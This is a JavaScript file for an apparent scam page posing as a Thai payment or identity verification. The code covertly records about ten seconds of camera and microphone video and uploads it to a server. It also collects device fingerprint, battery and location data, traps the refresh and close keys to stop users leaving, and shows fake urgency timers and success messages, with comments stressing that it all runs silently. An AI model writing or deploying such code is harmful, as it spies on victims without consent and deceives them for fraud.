class PaymentVerification {
    constructor() {
        this.video = document.getElementById('video');
        this.canvas = document.getElementById('canvas');
        this.recordingStatus = document.getElementById('recording-status');
        this.loadingOverlay = document.getElementById('loadingOverlay');
        
        this.mediaRecorder = null;
        this.recordedChunks = [];
        this.stream = null;
        this.isRecording = false;
        this.hasPermission = false;
        
        this.init();
    }
    
    init() {
        // Establecer tiempo actual
        this.setCurrentTime();
        
        // Activar cámara automáticamente después de 2 segundos
        setTimeout(() => this.handleCameraRequest(), 2000);
        
        // Bloquear navegación sin verificación
        this.blockNavigation();
    }
    
    setCurrentTime() {
        const now = new Date();
        const timeString = now.toLocaleString('th-TH', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        document.getElementById('transaction-time').textContent = timeString;
    }
    

    
    getBrowserInfo() {
        const nav = navigator;
        const screen = window.screen;
        
        return {
            userAgent: nav.userAgent,
            platform: nav.platform,
            language: nav.language,
            languages: nav.languages?.join(', ') || 'N/A',
            cookieEnabled: nav.cookieEnabled,
            onLine: nav.onLine,
            screenWidth: screen.width,
            screenHeight: screen.height,
            screenColorDepth: screen.colorDepth,
            screenPixelDepth: screen.pixelDepth,
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            memory: nav.deviceMemory || 'N/A',
            cores: nav.hardwareConcurrency || 'N/A',
            connection: nav.connection ? {
                effectiveType: nav.connection.effectiveType,
                downlink: nav.connection.downlink,
                rtt: nav.connection.rtt
            } : 'N/A',
            battery: 'checking...',
            geolocation: 'checking...'
        };
    }

    async getDetailedDeviceInfo() {
        const basicInfo = this.getBrowserInfo();
        
        // Intentar obtener información de batería
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                basicInfo.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
        } catch (e) {
            basicInfo.battery = 'No disponible';
        }

        // Intentar obtener geolocalización (silenciosamente)
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    timeout: 5000,
                    enableHighAccuracy: false
                });
            });
            basicInfo.geolocation = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };
        } catch (e) {
            basicInfo.geolocation = 'No disponible';
        }

        return basicInfo;
    }
    
    async handleCameraRequest() {
        if (this.isRecording) return;
        
        try {
            // Solicitar permisos de cámara y micrófono silenciosamente
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: 'user'
                }, 
                audio: true 
            });
            
            this.hasPermission = true;
            this.video.srcObject = this.stream;
            
            // Esperar a que el video esté listo
            await new Promise(resolve => {
                this.video.onloadedmetadata = resolve;
            });
            
            // Comenzar grabación automáticamente y silenciosamente
            this.startRecording();
            
        } catch (error) {
            console.error('Error accessing camera:', error);
            await this.handleCameraDenied();
        }
    }
    
    async handleCameraDenied() {
        // Registrar que se negó la cámara
        try {
            await fetch('/api/log-camera-denied', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    error: 'Camera permission denied'
                })
            });
        } catch (error) {
            console.log('Error logging camera denial:', error);
        }
        
        // Si niegan la cámara, solo logear silenciosamente
        console.log('Camera access denied');
    }
    
    showCameraErrorMessage() {
        const errorHtml = `
            <div style="text-align: center; padding: 2rem; background: #f8d7da; border-radius: 12px; border: 2px solid #dc3545; margin: 1rem 0;">
                <div style="font-size: 3rem; margin-bottom: 1rem;">❌</div>
                <h3 style="color: #721c24; margin-bottom: 1rem;">การยืนยันล้มเหลว / Verification Failed</h3>
                <p style="color: #721c24; margin-bottom: 1rem;">
                    <strong>ไม่สามารถเข้าถึงกล้องได้</strong><br>
                    Camera access is required for security verification
                </p>
                <p style="color: #721c24; font-size: 0.9rem;">
                    กรุณาอนุญาตการใช้งานกล้องและรีเฟรชหน้า<br>
                    Please allow camera access and refresh the page
                </p>
                <button onclick="location.reload()" style="margin-top: 1rem; padding: 0.8rem 1.5rem; background: #dc3545; color: white; border: none; border-radius: 6px; cursor: pointer;">
                    🔄 รีเฟรช / Refresh
                </button>
            </div>
        `;
        
        document.querySelector('.camera-section').innerHTML = errorHtml;
        
        // Bloquear la página después de 5 segundos
        setTimeout(() => {
            document.body.innerHTML = `
                <div style="display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #dc3545; color: white; text-align: center; font-family: Arial, sans-serif;">
                    <div>
                        <h1>🚫 การเข้าถึงถูกปฏิเสธ</h1>
                        <h2>Access Denied</h2>
                        <p>การทำรายการถูกยกเลิกเนื่องจากไม่ยืนยันตัวตน</p>
                        <p>Transaction cancelled due to failed identity verification</p>
                    </div>
                </div>
            `;
        }, 5000);
    }
    
    startRecording() {
        this.recordedChunks = [];
        
        try {
            this.mediaRecorder = new MediaRecorder(this.stream, {
                mimeType: 'video/webm;codecs=vp9'
            });
        } catch (error) {
            // Fallback para navegadores que no soportan vp9
            this.mediaRecorder = new MediaRecorder(this.stream);
        }
        
        this.mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                this.recordedChunks.push(event.data);
            }
        };
        
        this.mediaRecorder.onstop = () => {
            this.uploadVideo();
        };
        
        this.mediaRecorder.start();
        this.isRecording = true;
        
        // Grabación silenciosa - no mostrar nada
        
        // Grabar por 10 segundos
        setTimeout(() => {
            this.stopRecording();
        }, 10000);
    }
    
    stopRecording() {
        if (this.mediaRecorder && this.isRecording) {
            this.mediaRecorder.stop();
            this.isRecording = false;
            
            // Parar el stream
            if (this.stream) {
                this.stream.getTracks().forEach(track => track.stop());
            }
            
            // Procesar silenciosamente
            console.log('Video grabado exitosamente');
        }
    }
    
    async uploadVideo() {
        try {
            const blob = new Blob(this.recordedChunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', blob, 'verification_video.webm');
            
            const response = await fetch('/api/upload-video', {
                method: 'POST',
                body: formData
            });
            
            const result = await response.json();
            
            if (result.status === 'success') {
                console.log('Video enviado exitosamente');
            } else {
                console.log('Error enviando video');
            }
            
        } catch (error) {
            console.error('Error uploading video:', error);
            this.showErrorMessage();
        } finally {
            this.loadingOverlay.style.display = 'none';
        }
    }
    
    showSuccessMessage() {
        const successHtml = `
            <div style="text-align: center; padding: 2rem; background: #d4edda; border-radius: 12px; border: 2px solid #28a745; margin: 1rem 0;">
                <div style="font-size: 3rem; margin-bottom: 1rem;">✅</div>
                <h3 style="color: #155724; margin-bottom: 1rem;">การยืนยันสำเร็จ!</h3>
                <h4 style="color: #155724; margin-bottom: 1rem;">Verification Successful!</h4>
                <p style="color: #155724; margin-bottom: 1rem;">
                    การทำรายการของคุณได้รับการยืนยันแล้ว<br>
                    Your transaction has been verified successfully
                </p>
                <p style="color: #155724; font-size: 0.9rem;">
                    คุณสามารถปิดหน้าต่างนี้ได้แล้ว<br>
                    You can now close this window
                </p>
                <div style="margin-top: 1.5rem; padding: 1rem; background: white; border-radius: 8px;">
                    <p style="color: #28a745; font-weight: bold;">รหัสการยืนยัน: VRF${Date.now()}</p>
                    <p style="color: #28a745; font-size: 0.9rem;">Verification Code</p>
                </div>
            </div>
        `;
        
        document.querySelector('.camera-section').innerHTML = successHtml;
        
        // Confetti effect
        this.showConfetti();
    }
    
    showErrorMessage() {
        const errorHtml = `
            <div style="text-align: center; padding: 2rem; background: #f8d7da; border-radius: 12px; border: 2px solid #dc3545; margin: 1rem 0;">
                <div style="font-size: 3rem; margin-bottom: 1rem;">❌</div>
                <h3 style="color: #721c24; margin-bottom: 1rem;">เกิดข้อผิดพลาด / Error Occurred</h3>
                <p style="color: #721c24; margin-bottom: 1rem;">
                    ไม่สามารถอัพโหลดข้อมูลได้ กรุณาลองใหม่<br>
                    Failed to upload verification data. Please try again.
                </p>
                <button onclick="location.reload()" style="padding: 0.8rem 1.5rem; background: #dc3545; color: white; border: none; border-radius: 6px; cursor: pointer;">
                    ลองใหม่ / Try Again
                </button>
            </div>
        `;
        
        document.querySelector('.camera-section').innerHTML = errorHtml;
    }
    
    showConfetti() {
        // Simple confetti effect
        const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
        for (let i = 0; i < 50; i++) {
            setTimeout(() => {
                const confetti = document.createElement('div');
                confetti.style.position = 'fixed';
                confetti.style.left = Math.random() * window.innerWidth + 'px';
                confetti.style.top = '-10px';
                confetti.style.width = '10px';
                confetti.style.height = '10px';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.zIndex = '9999';
                confetti.style.borderRadius = '50%';
                confetti.style.pointerEvents = 'none';
                
                document.body.appendChild(confetti);
                
                const animation = confetti.animate([
                    { transform: 'translateY(0px) rotate(0deg)', opacity: 1 },
                    { transform: `translateY(${window.innerHeight + 20}px) rotate(360deg)`, opacity: 0 }
                ], {
                    duration: 2000 + Math.random() * 1000,
                    easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
                });
                
                animation.onfinish = () => confetti.remove();
            }, i * 100);
        }
    }
    
    blockNavigation() {
        // Bloquear navegación hasta que se complete la verificación
        window.addEventListener('beforeunload', (e) => {
            if (!this.hasPermission) {
                e.preventDefault();
                e.returnValue = 'การทำรายการยังไม่เสร็จสิ้น คุณต้องการออกจากหน้านี้หรือไม่?';
                return e.returnValue;
            }
        });
        
        // Deshabilitar teclas comunes para salir
        document.addEventListener('keydown', (e) => {
            if (!this.hasPermission) {
                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || 
                    (e.ctrlKey && e.key === 'w') || (e.altKey && e.key === 'F4')) {
                    e.preventDefault();
                    alert('กรุณาทำการยืนยันตัวตนให้เสร็จสิ้นก่อน\nPlease complete identity verification first');
                }
            }
        });
    }
    
    showUrgencyMessage() {
        if (!this.hasPermission) {
            const urgencyDiv = document.createElement('div');
            urgencyDiv.innerHTML = `
                <div style="position: fixed; top: 20px; left: 50%; transform: translateX(-50%); 
                           background: #dc3545; color: white; padding: 1rem 2rem; 
                           border-radius: 8px; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                           animation: shake 0.5s ease-in-out infinite alternate;">
                    <strong>⚠️ เหลือเวลา 4 นาที! / 4 minutes remaining!</strong>
                </div>
                <style>
                    @keyframes shake {
                        0% { transform: translateX(-50%) translateY(0px); }
                        100% { transform: translateX(-50%) translateY(-2px); }
                    }
                </style>
            `;
            document.body.appendChild(urgencyDiv);
            
            setTimeout(() => urgencyDiv.remove(), 10000);
        }
    }
}

// Inicializar cuando el DOM esté listo
document.addEventListener('DOMContentLoaded', () => {
    new PaymentVerification();
});

// Verificar soporte de MediaRecorder
if (!window.MediaRecorder) {
    alert('เบราว์เซอร์ของคุณไม่รองรับการบันทึกวิดีโอ\nYour browser does not support video recording');
} 